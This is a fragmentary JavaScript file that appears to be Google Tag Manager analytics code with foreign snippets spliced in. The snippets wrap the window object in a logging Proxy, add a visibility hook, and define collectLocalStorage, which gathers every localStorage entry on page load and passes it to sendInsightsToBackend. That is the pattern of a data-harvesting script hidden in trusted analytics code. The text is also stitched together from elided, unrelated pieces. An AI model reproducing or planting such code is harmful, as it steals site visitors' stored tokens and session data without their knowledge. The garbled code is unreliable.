...
(function () {
  ...
  */
  ...
  (function () {
    if (typeof window.seenVars === 'undefined') {
      window.seenVars = [];
    }
    const hooks = {};
    const tracker = function (target, prop, receiver) {
      if (!window.seenVars.includes(prop)) {
        window.seenVars.push(prop);
        if (typeof target[prop] === "function") {
          if (!hooks[prop]) {
            hooks[prop] = new Proxy(target[prop], {
              apply: function (target, thisArg, args) {
                console.log(`${prop} 函数被调用`);
          ...
          console.log(`${prop}: ${JSON.stringify(target[prop])}`);
    ...
    window = new Proxy(window, {
      ...
      set(target, prop, value, receiver) {
        console.log(`${prop} 被设置`);
        return Reflect.set(target, prop, value);
      }
    });
    document.addEventListener("visibilitychange", () => {
      if (document.visibilityState === "visible" && typeof performInspectionTask !== 'undefined') {
  ...
  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChEI8POGpwYQwKfQoLnu2YWNARInABhc5ufB5wnmmpKe8d6/0Cym0eZacETrX9Nhcq0nc6mWWz5xI+6xGgKBEA\x3d\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function collectLocalStorage() {
    ...
    const localStorageData = storageKeys.map(key => ({
      [key]: localStorage.getItem(key)
    }));
    sendInsightsToBackend(localStorageData);
  }
  var Bn = function () {
      var a = yn,
        b = zn,
  ...
  window.addEventListener("load", collectLocalStorage);
  function Qw(a) {
  ...
  function TC() {
    var a = new jb();
    L(this, "read_container_data"), a.set("containerId", 'UA-192628768-5'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", Xf), a.set("previewMode", Zf), a.set("environmentMode", Yf), Q(96) && a.set("firstPartyServing", ri || ti), a.sc();
    return a;
  }
